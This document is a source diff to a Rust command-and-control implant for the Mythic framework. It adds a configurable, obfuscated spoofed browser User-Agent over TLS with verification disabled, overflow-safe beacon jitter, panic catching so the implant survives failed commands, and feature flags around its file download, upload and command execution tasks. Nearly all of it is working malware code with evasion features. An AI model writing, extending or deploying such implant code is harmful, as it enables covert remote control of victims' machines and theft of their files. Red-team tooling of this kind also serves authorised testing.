@@ -230,8 +230,12 @@ pub fn build_client() -> ureq::Agent {
     let tls = ureq::tls::TlsConfig::builder()
         .disable_verification(true)
         .build();
-    let ua =
-        obfstr::obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").to_string();
+    // Configurable User-Agent (build parameter). Empty -> obfuscated built-in default.
+    let ua = match option_env!("USER_AGENT") {
+        Some(custom) if !custom.is_empty() => custom.to_string(),
+        _ => obfstr::obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+            .to_string(),
+    };
     let config = ureq::config::Config::builder()
         .timeout_global(Some(Duration::from_secs(30)))
         .user_agent(ua)
@@ -436,11 +440,12 @@ pub fn sleep_with_jitter(base: u64, jitter_pct: u32) {
     if jitter_pct == 0 || base == 0 {
         return sleep(base);
     }
-    let range = base * jitter_pct as u64 / 100;
+    let range = base.saturating_mul(jitter_pct as u64) / 100;
     if range == 0 {
         return sleep(base);
     }
-    let offset = rand::random::<u64>() % (2 * range + 1);
+    let spread = range.saturating_mul(2).saturating_add(1);
+    let offset = rand::random::<u64>() % spread;
     let t = base.saturating_sub(range).saturating_add(offset);
     sleep(t.max(1));
 }
@@ -905,6 +910,21 @@ pub struct RegisterInfo {
     pub integrity_level: u8,
 }
 
+/// Runs a task execution closure, converting any panic into an error output
+/// so a single failing command can never crash the whole implant.
+fn run_safely<F>(task_id: &str, f: F) -> CommandOutput
+where
+    F: FnOnce() -> CommandOutput,
+{
+    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(f)) {
+        Ok(output) => output,
+        Err(_) => CommandOutput::text(format!(
+            "[-] internal error while executing task {} (command panicked; implant continues)",
+            task_id
+        )),
+    }
+}
+
 pub fn run_c2_loop<F>(
     callback: &str,
     implant_secret: &str,
@@ -1080,17 +1100,20 @@ pub fn run_c2_loop<F>(
 
             // Download and upload use Mythic's chunked file transfer protocol
             // and require multiple round-trips — handle them outside of dispatch.
-            if task.command == obfstr::obfstr!("download") {
+            if cfg!(feature = "cmd-download") && task.command == obfstr::obfstr!("download") {
                 let path = expand_tilde(&extract_param(&task.parameters, "path"));
-                let output = mythic_download(
-                    &client,
-                    &base,
-                    uri,
-                    &callback_id,
-                    &encryption_key,
-                    &task.id,
-                    &path,
-                );
+                let output = run_safely(&task.id, || {
+                    CommandOutput::text(mythic_download(
+                        &client,
+                        &base,
+                        uri,
+                        &callback_id,
+                        &encryption_key,
+                        &task.id,
+                        &path,
+                    ))
+                })
+                .text;
                 let is_error = output.starts_with("[-]");
                 responses.push(TaskResponse {
                     task_id: task.id.clone(),
@@ -1108,19 +1131,22 @@ pub fn run_c2_loop<F>(
                 });
                 continue;
             }
-            if task.command == obfstr::obfstr!("upload") {
+            if cfg!(feature = "cmd-upload") && task.command == obfstr::obfstr!("upload") {
                 let file_id = extract_param(&task.parameters, "file");
                 let dest = expand_tilde(&extract_param(&task.parameters, "remote_path"));
-                let output = mythic_upload(
-                    &client,
-                    &base,
-                    uri,
-                    &callback_id,
-                    &encryption_key,
-                    &task.id,
-                    &file_id,
-                    &dest,
-                );
+                let output = run_safely(&task.id, || {
+                    CommandOutput::text(mythic_upload(
+                        &client,
+                        &base,
+                        uri,
+                        &callback_id,
+                        &encryption_key,
+                        &task.id,
+                        &file_id,
+                        &dest,
+                    ))
+                })
+                .text;
                 let is_error = output.starts_with("[-]");
                 responses.push(TaskResponse {
                     task_id: task.id.clone(),
@@ -1139,7 +1165,7 @@ pub fn run_c2_loop<F>(
                 continue;
             }
 
-            let result = dispatch(&task.command, &task.parameters);
+            let result = run_safely(&task.id, || dispatch(&task.command, &task.parameters));
             let is_error = result.text.starts_with("[-]");
             responses.push(TaskResponse {
                 task_id: task.id.clone(),
@@ -1726,8 +1752,16 @@ mod tests {
     fn test_dispatch_common_execute_missing_command_returns_usage_error() {
         // No "command" key → extract_param returns "" → falls back to raw params
         // "{}" which split_whitespace reduces to empty → usage error.
-        let out = dispatch_common("execute", "{}").expect("execute handled");
-        assert!(out.text.starts_with("[-]"));
+        // Requires the cmd-execute feature (as in every platform build).
+        #[cfg(feature = "cmd-execute")]
+        {
+            let out = dispatch_common("execute", "{}").expect("execute handled");
+            assert!(out.text.starts_with("[-]"));
+        }
+        #[cfg(not(feature = "cmd-execute"))]
+        {
+            assert!(dispatch_common("execute", "{}").is_none());
+        }
     }
 
     #[test]
